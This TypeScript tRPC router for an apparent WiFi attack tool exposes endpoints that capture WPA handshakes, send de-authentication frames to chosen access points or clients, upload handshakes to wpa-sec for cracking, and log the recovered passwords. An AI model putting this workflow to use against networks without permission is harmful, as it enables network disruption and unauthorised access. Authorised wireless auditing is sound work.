import { protectedProcedure, router } from "../_core/trpc";
import { z } from "zod";
import { TRPCError } from "@trpc/server";
import * as db from "../db";
import {
  getHuntingOrchestrator,
  cleanupHuntingOrchestrator,
} from "../hunting/hunting-orchestrator";
import { getWpaSecIntegration } from "../hunting/wpasec-integration";

const HUNTING_CONFIG = {
  interface: process.env.WIFI_INTERFACE || "wlan0",
  outputDir: process.env.HUNTING_OUTPUT_DIR || "/tmp/savage-hunting",
  aggressiveness: (process.env.HUNTING_AGGRESSIVENESS as any) || "medium",
};

export const huntingRouter = router({
  /**
   * Start hunting session
   */
  startSession: protectedProcedure
    .input(
      z.object({
        targetArea: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      try {
        const session = await db.createHuntingSession(
          ctx.user.id,
          input.targetArea
        );

        if (!session) {
          throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });
        }

        // Initialize hunting orchestrator
        const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);

        // Start hunting
        await orchestrator.start(session.id);

        await db.logActivity(
          ctx.user.id,
          "hunting_started",
          "info",
          `Started hunting session in ${input.targetArea || "unspecified area"}`,
          "hunting_session",
          session.id
        );

        return session;
      } catch (error) {
        console.error("[Hunting] Failed to start session:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Failed to start hunting session",
        });
      }
    }),

  /**
   * Stop hunting session
   */
  stopSession: protectedProcedure
    .input(z.object({ sessionId: z.number() }))
    .mutation(async ({ ctx, input }) => {
      try {
        const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);

        if (!orchestrator.isActive()) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: "Hunting is not active",
          });
        }

        await orchestrator.stop();
        await db.updateHuntingSessionStatus(input.sessionId, "completed");

        await db.logActivity(
          ctx.user.id,
          "hunting_stopped",
          "info",
          "Stopped hunting session",
          "hunting_session",
          input.sessionId
        );

        return { success: true };
      } catch (error) {
        console.error("[Hunting] Failed to stop session:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Failed to stop hunting session",
        });
      }
    }),

  /**
   * Get hunting sessions
   */
  getSessions: protectedProcedure.query(async ({ ctx }) => {
    return db.getHuntingSessionsByUser(ctx.user.id);
  }),

  /**
   * Get access points
   */
  getAccessPoints: protectedProcedure.query(async ({ ctx }) => {
    const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);
    return orchestrator.getAccessPoints();
  }),

  /**
   * Get captured handshakes
   */
  getHandshakes: protectedProcedure.query(async ({ ctx }) => {
    const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);
    return orchestrator.getHandshakes();
  }),

  /**
   * De-authenticate clients
   */
  deauthenticate: protectedProcedure
    .input(
      z.object({
        bssid: z.string(),
        clientMac: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      try {
        const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);

        if (!orchestrator.isActive()) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: "Hunting is not active",
          });
        }

        await orchestrator.deauthenticate(input.bssid, input.clientMac);

        await db.logActivity(
          ctx.user.id,
          "deauth_sent",
          "info",
          `Sent de-auth to ${input.bssid}`,
          "hunting_session",
          0
        );

        return { success: true };
      } catch (error) {
        console.error("[Hunting] Failed to de-authenticate:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Failed to send de-authentication",
        });
      }
    }),

  /**
   * Upload handshake to wpa-sec
   */
  uploadToWpaSec: protectedProcedure
    .input(
      z.object({
        handshakeId: z.string(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      try {
        const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);
        const handshakeManager = orchestrator.getHandshakeManager();
        const handshake = handshakeManager.getHandshake(input.handshakeId);

        if (!handshake) {
          throw new TRPCError({
            code: "NOT_FOUND",
            message: "Handshake not found",
          });
        }

        const wpaSec = getWpaSecIntegration();
        const job = await wpaSec.uploadHandshake(
          handshake.filePath,
          handshake.bssid,
          handshake.ssid
        );

        handshakeManager.markUploadedToWpaSec(input.handshakeId, job.jobId);

        await db.logActivity(
          ctx.user.id,
          "handshake_uploaded",
          "info",
          `Uploaded handshake to wpa-sec: ${job.jobId}`,
          "handshake",
          parseInt(input.handshakeId.slice(0, 8), 16)
        );

        return job;
      } catch (error) {
        console.error("[Hunting] Failed to upload to wpa-sec:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Failed to upload handshake",
        });
      }
    }),

  /**
   * Check wpa-sec job status
   */
  checkWpaSecStatus: protectedProcedure
    .input(z.object({ jobId: z.string() }))
    .query(async ({ ctx, input }) => {
      try {
        const wpaSec = getWpaSecIntegration();
        const job = await wpaSec.checkJobStatus(input.jobId);

        if (!job) {
          throw new TRPCError({
            code: "NOT_FOUND",
            message: "Job not found",
          });
        }

        // If cracked, update handshake
        if (job.password) {
          const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);
          const handshakeManager = orchestrator.getHandshakeManager();

          // Find handshake by job ID
          const handshakes = handshakeManager.getAllHandshakes();
          const handshake = handshakes.find((h) => h.wpaSecJobId === input.jobId);

          if (handshake) {
            handshakeManager.updateCrackStatus(
              handshake.id,
              "cracked",
              job.password,
              "wpa-sec"
            );

            await db.logActivity(
              ctx.user.id,
              "handshake_cracked",
              "high",
              `Handshake cracked via wpa-sec: ${job.password}`,
              "handshake",
              parseInt(handshake.id.slice(0, 8), 16)
            );
          }
        }

        return job;
      } catch (error) {
        console.error("[Hunting] Failed to check wpa-sec status:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Failed to check job status",
        });
      }
    }),

  /**
   * Get hunting statistics
   */
  getStats: protectedProcedure.query(async ({ ctx }) => {
    const orchestrator = getHuntingOrchestrator(ctx.user.id, HUNTING_CONFIG);
    return orchestrator.getStats();
  }),
});
